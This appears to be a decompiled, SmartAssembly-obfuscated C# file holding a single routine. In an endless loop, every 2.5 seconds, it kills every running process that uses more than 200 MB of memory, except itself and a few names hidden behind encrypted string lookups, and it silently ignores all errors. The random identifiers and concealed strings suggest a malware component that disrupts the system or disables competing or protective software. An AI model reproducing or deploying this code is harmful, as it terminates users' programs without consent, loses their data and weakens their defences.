using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fmTenshUnV;

public static class piQkBxQtDXQ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ZxJLdKwjkkx()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107401521)) && !process.ProcessName.Contains(getString_0(107401512)) && !process.ProcessName.Contains(getString_0(107401471)) && !process.ProcessName.Contains(getString_0(107401494)) && !process.ProcessName.Contains(getString_0(107401481)) && !process.ProcessName.Contains(getString_0(107401436)) && !process.ProcessName.Contains(getString_0(107401455)) && !process.ProcessName.Contains(getString_0(107401410)) && !process.ProcessName.Contains(getString_0(107401429)) && !process.ProcessName.Contains(getString_0(107401416)) && !process.ProcessName.Contains(getString_0(107401907)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static piQkBxQtDXQ()
	{
		Strings.CreateGetStringDelegate(typeof(piQkBxQtDXQ));
	}
}
